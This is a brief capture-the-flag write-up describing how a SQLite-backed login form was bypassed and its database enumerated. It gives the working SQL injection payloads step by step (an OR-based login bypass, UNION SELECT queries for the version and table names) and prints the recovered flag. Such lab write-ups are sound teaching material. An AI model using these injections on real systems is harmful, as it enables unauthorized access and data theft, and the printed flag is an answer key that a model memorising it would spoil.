Write-up:

1. Looking at the source code, we see the login input isn't protected against SQLi, and that
the database is SQLite. After creating a `admin:admin` user, logging in with 
`admin:' OR '1'='1` proves to be successful.

2. Using `' UNION SELECT sqlite_version()--` as the `username` shows us this is SQLite v.3.45.1.
`' UNION SELECT name FROM sqlite_schema WHERE type='table'--` shows us the table that contains the flag: <br> `aPykoNViNvF20ZlQ5Trntl079TS22XlPCizUNsgYcTkIdF9MSvtZeuWZSvI2vpGglxndFkpXB1TXeIBiuPy1bkc8TT2WlpwkuzKyh`

3. `' UNION SELECT flag FROM aPykoNViNvF20ZlQ5Trntl079TS22XlPCizUNsgYcTkIdF9MSvtZeuWZSvI2vpGglxndFkpXB1TXeIBiuPy1bkc8TT2WlpwkuzKyh--` returns the flag: `LITCTF{w04h_sQl?_l0v3_to_S3e_iT}`